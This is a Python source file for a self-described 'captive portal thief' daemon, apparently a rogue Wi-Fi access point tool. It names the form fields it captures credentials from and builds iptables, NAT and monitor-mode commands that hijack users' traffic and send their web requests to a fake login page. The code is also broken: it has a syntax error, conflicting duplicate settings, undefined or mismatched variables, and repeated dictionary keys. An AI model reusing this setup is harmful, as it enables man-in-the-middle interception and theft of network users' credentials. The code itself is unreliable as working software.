#!/usr/bin/python3
# -*- coding: utf-8 -*-
################################################################################
##   Captive portal thief/ rehosting daemon  -   python , flask , sqlalchemy  ##
################################################################################
# Copyright (c) 2020 Adam Galindo                                             ##
#                                                                             ##
# Permission is hereby granted, free of charge, to any person obtaining a copy##
# of this software and associated documentation files (the 'Software'),to deal##
# in the Software without restriction, including without limitation the rights##
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell   ##
# copies of the Software, and to permit persons to whom the Software is       ##
# furnished to do so, subject to the following conditions:                    ##
#                                                                             ##
# Licenced under GPLv3                                                        ##
# https://www.gnu.org/licenses/gpl-3.0.en.html                                ##
#                                                                             ##
# The above copyright notice and this permission notice shall be included in  ##
# all copies or substantial portions of the Software.                         ##
#
# THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
################################################################################

__author__  = 'Adam Galindo'
__email__   = 'null@null.com'
__version__ = '1'
__license__ = 'GPLv3'
__name__    = 'captive_portal using pybashy'

import os
import re
import ipaddress
from flask import Flask
from captive_portal.std_imports import *
from captive_portal.flask_database_backend import LoginInformation,ConnectedHosts

def create_app():
    app = Flask(__name__)
    db.init_app(app)
    return app

# These variables are used as settings
#set to your appropriate ifaces
FLASK_PORTAL_PAGE      = '/login.php.html'
FLASK_HOST_PORT        = 9090
# this changes to suit the network of operation
PORTAL_IFACE           = 'wlan2'
CAPTIVE_PORTAL_IP      = '192.168.0.2'
#listening interface
monitor_interface      = 'eth0'
manipulation_interface = 'eth1'
# form input names to capture credentials
name_input             = 'name'
email_input_name       = 'email'
submit_form_name       = 'submit'
FLASK_PORTAL_PAGE      = '/login.php.html'
FLASK+HOST_PORT        = 8080
CAPTIVE_PORTAL_IP      = '192.168.0.8'

def authorize_traffic_passthrough(remote_ip):
    steps = { 
                'host_forwarding_NAT' : ['iptables -t nat -I PREROUTING 1 -s{} -j ACCEPT'.format(remote_IP),
                        '[+] Command host_forwarding_NAT', 
                        '[+] host_forwarding_NAT Rule Added', 
                        '[-] Command Failed! Check the logfile!'
                        ],                 
                'host_forwarding_passthough' : ['iptables -I FORWARD -s remote_IP -j ACCEPT',
                        '[+] Command host_forwarding_passthough', 
                        '[+] host_forwarding_passthough Rule Added', 
                        '[-] Command Failed! Check the logfile!'
                        ]
    }
    
    info_message = '[+] Updating IP tables to allow {} through'.format(remote_IP)
    success_message = '[+] Traffic Passed'
    failure_message = '[-] Command Failed! Check the logfile!'

def enable_monitor_mode(iface:str, ip_address):
    steps = {
            'instruction1' : ['ip link set {0} down'.format(iface),
                              '[+]info',
                              '[+]success',
                              '[-]failure'
            ],
            'instruction2' : ['ip addr add {0} dev {1}'.format(ip_address, iface),
                              '[+]info',
                              '[+]success',
                              '[-]failure'
            ],
            'instruction3' : ['iwconfig {} mode monitor'.format(monitor_interface),
                              '[+]info',            
                              '[+] Monitor Mode Enabled',
                              '[-] Failed to set monitor mode'
            ],
            'instruction4' : ['ip link set {0} up'.format(iface),
                              '[+] Bringing {} back up'.format(iface),
                              '[+] Success',
                              '[-] Failure'
            ]
    }

def function_ClearIPtables():
    steps = {
                 'instruction3' : ['ip link set {0} up'.format(iface),
                                   '[+]Clearing IP Tables Rulesets',
                                   '[+] Success',
                                   '[-] Failure'
                ],
                'instruction4' : ['iptables -w 3 --flush',
                                  '[+]info',
                                  '[+]success',
                                  '[-]failure'            
                ],
                'instruction5' : ['iptables -w 3 --table nat --flush',
                                  '[+]info',
                                  '[+]success',
                                  '[-]failure'            
                ],
                'instruction6' : ['iptables -w 3 --delete-chain',
                                  '[+]info',
                                  '[+]success',
                                  '[-]failure'
                ],
                'instruction7' : ['iptables -w 3 --table nat --delete-chain',
                                  '[+]info',
                                  '[+]success',
                                  '[-]failure'
                ]
            }
    info_message    = '[+] Clearing IP Tables Rulesets'
    success_message = '[+] Rules Cleared'
    failure_message = '[-] Command Failed! Check the logfile!'

def function_EstablishMITMnetwork():
    steps = {
            'instruction3' : ['ip link set {} up'.format(iface),
                              '[+]info ',
                              '[+]success',
                              '[-]failure'
                             ],        
                      
            'instruction4' : ['iptables -w 3 --flush',
                              '[+]info',
                              '[+]success',
                              '[-]failure'            
                              ],
            'instruction5' : ['iptables -w 3 --table nat --flush',
                              '[+]info',
                              '[+]success',
                              '[-]failure'            
                             ],
            'instruction6' : ['iptables -w 3 --delete-chain',
                              '[+]info',
                              '[+]success',
                              '[-]failure'            
                             ],             
            'instruction7' : ['iptables -w 3 --table nat --delete-chain',
                              '[+]info',
                              '[+]success',
                              '[-]failure'            
                             ]
   }
    info_message    = '[+] info'
    success_message = '[+] Success'
    failure_message = '[-] Command Failed! Check the logfile!'

#'echo 1 > /proc/sys/net/ipv4/ip_forward'
def set_network_forwarding():
    steps = {'set_ipv4_forwarding' : ['sysctl -w net.ipv4.conf.{}.forwarding=1'.format(host_iface),
                                      '[+] Informational Text!',
                                      '[+] Sucessful!',
                                      '[-] Failure!'
                                     ],
             #Allow from sandbox to outside
             'allow_inside_out'   : ['iptables -A FORWARD -i {} -o {} -j ACCEPT'.format(sandy_iface, host_iface),
                                     '[+] Informational Text!',
                                     '[+] Sucessful!',
                                     '[-] Failure!'
                                    ],
             #Allow from outside to sandbox
             'allow_outside_in'   : ['iptables -A FORWARD -i {} -o {} -j ACCEPT'.format(host_iface, sandy_iface),
                                     '[+] Informational Text!',
                                     '[+] Sucessful!',
                                     '[-] Failure!'
                                    ]
    }
    
def establish_traffic_rulesets():

    steps = { 'instruction1' : ['iptables -w 3 --table nat --append POSTROUTING --out-interface {} -j MASQUERADE'.format(iface),
                                '[+]Setup a NAT environment',
                                '[+] Rule Added',
                                '[-] Command Failed'
                               ],
              'instruction2' : ['iptables -w 3 --append FORWARD --in-interface {} -j ACCEPT'.format(monitor_interface),
                                '[+]allow incomming from the outside on the monitor iface',
                                '[+] Rule Added',
                                '[-] Command Failed'
                               ],
              'instruction3' : ['iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to {}'.format(IP_ADDRESS),
                               '[+]allow UDP DNS resolution inside the NAT  via prerouting',
                               '[+] Rule Added',
                               '[-] Command Failed'
                               ],
              'instruction4' : ['iptables -w 3 -A INPUT -i lo -j ACCEPT',
                                '[+]Allow Loopback Connections in',
                                '[+] Rule Added',
                                '[-] Command Failed'
                                ],
              'instruction5' : ['iptables -w 3 -A OUTPUT -o lo -j ACCEPT',
                                '[+]Allow Loopback Connections out',
                                '[+] Rule Added',
                                '[-] Command Failed'
                                ],
              'instruction6' : ['iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT',
                                 '[+] Allow Established and Related Incoming Connections',
                                 '[+] Rule Added',
                                 '[-] Command Failed'
                                ],
              'instruction7' : ['iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT' ,
                                 '[+] Allow Established Outgoing Connections',
                                 '[+] Rule Added',
                                 '[-] Command Failed'
                                ],
              'instruction8' : ['iptables -w 3 -A FORWARD -i {} -o {} -j ACCEPT'.format(monitor_interface, iface),
                                 '[+] Forwarding In/Out ACCEPT',
                                 '[+] Rule Added',
                                 '[-] Command Failed'
                                ],
              'instruction9' : ['iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP',
                                 '[+] Dropping Invalid Connections In',
                                 '[+] Rule Added',
                                 '[-] Command Failed'
                                ],

              'instruction9' : ['iptables -w 3 -A FORWARD -i IFACE -p tcp --dport 53 -j ACCEPT',
                                '[+] DNS/TCP Forwarding'
                                '[+] Rule Added',
                                '[-] Command Failed'
                               ],
              'instruction9' : ['iptables -w 3 -A FORWARD -i {} -p udp --dport 53 -j ACCEPT'.format(iface),
                                '[+] DNS/UDP Forwarding',
                                '[+] Rule Added',
                                '[-] Command Failed'
    
                               ],
              'instruction9' : ['iptables -w 3 -A FORWARD -i {} -p tcp --dport {} -d {} -j ACCEPT'.format(iface, port, ip_address),
                                '[+] Allow all traffic to captive portal',
                                '[+] Rule Added',
                                '[-] Command Failed'
                               ],
              'instruction9' : ['iptables -w 3 -A FORWARD -i {} -j DROP'.format(iface),
                                '[+] Block all other traffic',
                                '[+] Rule Added',
                                '[-] Command Failed'
                               ],
              'instruction9' : ['iptables -t nat -A PREROUTING -i {} -p tcp --dport 80 -j DNAT --to-destination {}:{}'.format(iface, ip_address, port),
                                '[+] Redirecting HTTP traffic to captive portal',
                                '[+] Rule Added',
                                '[-] Command Failed'
                               ]
    }
